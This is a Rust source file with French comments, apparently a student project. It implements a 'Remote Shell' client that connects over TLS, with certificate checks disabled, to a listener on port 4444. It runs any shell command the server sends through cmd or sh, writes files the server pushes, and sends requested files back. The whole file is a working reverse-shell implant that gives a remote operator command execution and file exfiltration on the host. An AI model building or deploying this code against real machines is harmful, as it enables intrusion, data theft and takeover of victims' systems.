use std::io::{Write, BufRead, BufReader};
use std::net::TcpStream;
use std::process::Command;
use std::path::Path;
use std::{env, fs};
use native_tls::TlsConnector;
use base64::{Engine as _, engine::general_purpose};

const SERVER_IP: &str = "127.0.0.1";
const SERVER_PORT: &str = "4444";

fn main() {
    println!("Démarrage du client Remote Shell...");

    let connector = TlsConnector::builder()
        .danger_accept_invalid_certs(true)  //De base TLS protège contre l'usurpation d'identité en vérifiant que le certificat du serveur est signé par une autorité reconnue (ex:GOOGLE), mais nous dans le cadre de ce projet on a créer un certificat donc pas connu
        .build()
        .unwrap();

    match TcpStream::connect(format!("{}:{}", SERVER_IP, SERVER_PORT)) {
        Ok(stream) => {
            println!("Connecté à {}:{}", SERVER_IP, SERVER_PORT);
            
            match connector.connect(SERVER_IP, stream) { //Handshake TLS.
                Ok(mut stream) => {
                    println!("Tunnel TLS sécurisé établi.");
                    
                    let mut reader = BufReader::new(stream);
                    let mut buffer = String::new();

                    loop {
                        buffer.clear(); // Vide la mémoire de la commande précedante
                        match reader.read_line(&mut buffer) { // Attends la nouvelle commande
                            Ok(n) => {
                                if n == 0 { break; }
                                let cmd_line = buffer.trim().to_string();



                                // On a mis le flux réseaux (stream) dans un buffer pour pouvoir lire ligne par ligne.
                                // reader = propriaitaire du flux mais pour répondre au serveur -> écrire dans le flux.
                                // get_mut() = avoir un accès modifiable du flux le temps d'envoyer la réponse.
                                let output_stream = reader.get_mut();
                                
                                process_command(cmd_line, output_stream);
                            }
                            Err(e) => {
                                eprintln!("Erreur de lecture: {}", e);
                                break;
                            }
                        }
                    }
                },
                Err(e) => eprintln!("Erreur lors du handshake TLS: {}", e),
            }
        },
        Err(e) => eprintln!("Impossible de se connecter: {}", e),
    }
}

/// Fonction centrale qui analyse et exécute les commandes
fn process_command(cmd_line: String, stream: &mut native_tls::TlsStream<TcpStream>) {
    let parts: Vec<&str> = cmd_line.split_whitespace().collect();
    if parts.is_empty() { return; }

    //exemple avec uplaod ok test.txt
    let command = parts[0];  // contient upload
    let args = &parts[1..]; // ["ok", "test.txt"]

    match command {
        "cd" => {
            // Changement de répertoire (commande interne au shell)
            let new_dir = if args.is_empty() { "/" } else { args[0] };

            //On modifie l'environnement du processus Rust lui-même. Si on lançait juste cmd /c cd .., cela lancerait un sous-processus qui changerait de dossier puis s'éteindrait immédiatement, 
            //sans affecter notre programme.
            let root = Path::new(new_dir);
            if let Err(e) = env::set_current_dir(&root) {
                let _ = stream.write_all(format!("Erreur CD: {}\n", e).as_bytes());
            } else {
                let _ = stream.write_all(b"Repertoire change.\n");
            }
        },
        "upload" => {
            // Nouvelle Syntaxe reçue du serveur: upload <BASE64_DATA> <NOM_FICHIER>
            if args.len() >= 2 {
                let b64_data = args[0];
                let filename = args[1];

                // 1. On décode le Base64 pour retrouver les octets originaux (binaire)
                match general_purpose::STANDARD.decode(b64_data) {
                    Ok(bytes) => {
                        // 2. On écrit les octets bruts dans le fichier
                        if let Err(e) = fs::write(filename, bytes) {
                             let _ = stream.write_all(format!("Erreur écriture disque: {}\n", e).as_bytes());
                        } else {
                             let _ = stream.write_all(b"Succes: Fichier binaire uploade.\n");
                        }
                    },
                    Err(e) => {
                         let _ = stream.write_all(format!("Erreur décodage Base64: {}\n", e).as_bytes());
                    }
                }
            } else {
                 let _ = stream.write_all(b"Erreur protocole upload.\n");
            }
        },
        "download" => {
            if let Some(filename) = args.get(0) {
                // read() renvoie un Vec<u8> (une suite d'octets), compatible avec tout (images, exe, pdf...)
                //Lit le fichier bit par bit
                match fs::read(filename) {
                    Ok(data) => {
                        // On envoie les données brutes directement.
                        let _ = stream.write_all(&data);
                    },
                    Err(e) => {
                        
                        let _ = stream.write_all(format!("Erreur Download: {}\n", e).as_bytes());
                    }
                }
            }
        },
        "exit" => {
            let _ = stream.write_all(b"Fermeture.\n");
            std::process::exit(0);
        },
        _ => {
            // Exécution d'une commande système (OS)
            execute_os_command(command, args, stream);
        }
    }
}

/// Exécute une commande système selon l'OS (Windows ou Linux)
fn execute_os_command(cmd: &str, args: &[&str], stream: &mut native_tls::TlsStream<TcpStream>) {
    
    // Détection de l'OS à la compilation
    #[cfg(target_os = "windows")]
    let (shell, flag) = ("cmd", "/C");
    
    #[cfg(not(target_os = "windows"))]
    let (shell, flag) = ("sh", "-c");

    // Reconstruction de la commande complète
    let full_cmd = format!("{} {}", cmd, args.join(" "));

    let output = Command::new(shell)
        .args(&[flag, &full_cmd])
        .output();

    match output {
        Ok(output) => {
            // On renvoie stdout (succès) et stderr (erreurs)
            let _ = stream.write_all(&output.stdout);
            let _ = stream.write_all(&output.stderr);
        },
        Err(e) => {
            let _ = stream.write_all(format!("Erreur d'execution: {}\n", e).as_bytes());
        }
    }
}



